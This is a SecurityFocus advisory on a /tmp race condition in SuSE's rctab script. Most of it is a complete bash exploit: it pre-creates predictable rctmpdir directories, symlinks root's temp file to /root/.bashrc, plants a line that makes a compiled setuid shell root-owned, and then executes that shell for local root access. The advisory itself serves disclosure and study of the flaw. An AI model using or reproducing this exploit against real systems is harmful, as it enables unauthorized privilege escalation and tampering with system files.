source: http://www.securityfocus.com/bid/2207/info

rctab is the Run Control Tab script included with the SuSE distribution of the Linux Operating System. SuSE is a freely available, Open Source Operating system maintained by SuSE Incorporated.

A race condition in the rctab script could allow an attacker to either gain elevated privileges, or append to and corrupt system files. This problem exists due to the insecure creation of files in the /tmp directory by the rctab script. Upon execution of the rctab script, rctab creates a subdirectory in the /tmp directory, using directory name rctmpdir.[pid of rctab process]. The script, which is normally run by root, does not check for an already existing rctmpdir.[pid of rctab process] directory. Additionally, the use of the -p flag with mkdir does not generate an error when the directory already exists, allowing the script to continue executing.

This problem makes it possible for a malicious user to guess the future process id of the rctab process, and create a range of directories that either will overwrite system files, or append to other system files and potentially allow elevation of privileges. 

#!/bin/bash
#       any user can force changes to runlevels
#       by IhaQueR

declare -i PLOW
declare -i PHIGH

# CONFIG:

PLOW=1
PHIGH=3

TMP="/tmp"
FAKERC=/tmp/fakerc
RCTMPDIR="rctmpdir"
RCTMP="rctmp"
WRITETO="/root/.bashrc"
SUSH="/tmp/sush"

# what we want to write to $WRITETO (oops...)
declare -i idx
idx=0
rchead=""

while test "$idx" -lt 128 ; do
        rchead="$rchead "
        idx=$(($idx+1))
done

rchead="$rchead chown root.root $SUSH; chmod 4777 $SUSH | cat >/dev/null
<<_DUPA_"

_pwd="$PWD"


#
echo "----------------------------------------------"
echo "|                                            |"
echo "|        local rctab root exploit            |"
echo "|           you would need luck              |"
echo "|       and an admin stupid enough           |"
echo "|            by IhaQueR '2001                |"
echo "|                                            |"
echo "----------------------------------------------"
echo

# test sys
awkl=$(which awk)
if test -x $awkl ; then
        echo "[+] awk found"
else
        echo "[-] awk not found, edit this script :-)"
        exit 1
fi

if test -r /sbin/rctab ; then
        echo "[+] rctab found"
else
        echo "[-] rctab not found, sorry"
        exit 1
fi

# make suid shell
echo "[+] compiling suid shell"
cat << _DUPA_ >/tmp/sush.c
#include <stdio.h>
main(int argc, char** argv) {setuid(0); setgid(0); execv("/bin/sh",
argv); }
_DUPA_

# compile shell
gcc /tmp/sush.c -o $SUSH


# crate dirs
echo "[+] now creating directories"
echo "    this may take a while"
echo

declare -i cnt
cnt=$PLOW
umask 000

while [ $cnt -lt $PHIGH ]
do
        cnt=$(($cnt+1))
        if [ $(($cnt % 128)) -eq 0 ] ; then
                printf "[%6d] " $cnt
        fi;
        if [ $(($cnt % 1024)) -eq 0 ] ; then
                echo
        fi;
        mkdir -p "$TMP/$RCTMPDIR.$cnt"
done

echo
echo
echo "    finished creating dirs"
echo

# wait for rctab -e
declare -i rctabpid
rctabpid=0
echo "[+] waiting for root to run rctab"

while [ 1 ]
do
        rctabpid=`ps aux|grep "rctab -e"|grep root|head -n1|awk '{print $2}'`
        if test $rctabpid -gt 1 ; then
                break
        fi
        sleep 1
done

# rcfile in
rcfile="/tmp/rctmpdir.$rctabpid/$RCTMP"

# append our cmd
echo >$rcfile "$rchead"

echo "[+] got rctab -e at pid $rctabpid"

# test if we own the directory
rcdir="/tmp/rctmpdir.$rctabpid"

if test -O $rcdir ; then
        echo "[+] ok, we own the dir"
else
        echo "[-] hm, we are not owner"
        exit 2
fi

# wait for editor
declare -i vipid
vipid=0
while [ $vipid -lt 1 ]
do
        vipid=`ps aux|grep rctmpdir|grep root|awk '{print $2}'`
done

echo "    root is editing now at pid $vipid, wait for writing $rcfile"
sleep 1

pfile="/proc/$vipid"

# relink
declare -i lcnt
lcnt=$(wc -l $rcfile|awk '{print $1-2 }')
tail -n$lcnt $rcfile >$rcfile.new
rm -rf $rcfile
ln -sf $WRITETO $rcfile

if test -r "$WRITETO" ; then
        md=$(cat $WRITETO|md5sum)
fi

if test -r $WRITETO ; then
        ac=$(ls -l --full-time $WRITETO)
else
        ac="none"
fi

# wait for root to write rctab or exit
while test -d $pfile
do
        if test -r "$WRITETO" ; then
                oc="$(ls -l --full-time $WRITETO)"
                if test "$ac" != "$oc" ; then
                        echo "[+] $WRITETO replaced"
                        break
                fi
        fi
done
rm -rf $rcfile; ln -s $rcfile.new $rcfile

if test "$md" = "$(cat $WRITETO|md5sum)" ; then
        echo "[-] bashrc not changed, sorry"
        exit 2
else
        echo "[+] gotcha! wait for root to login"
fi

# now wait for root to login :-)
while test -O $SUSH ; do
        sleep 1
done

echo "[+] suid shell at $SUSH"
sleep 1
$SUSH
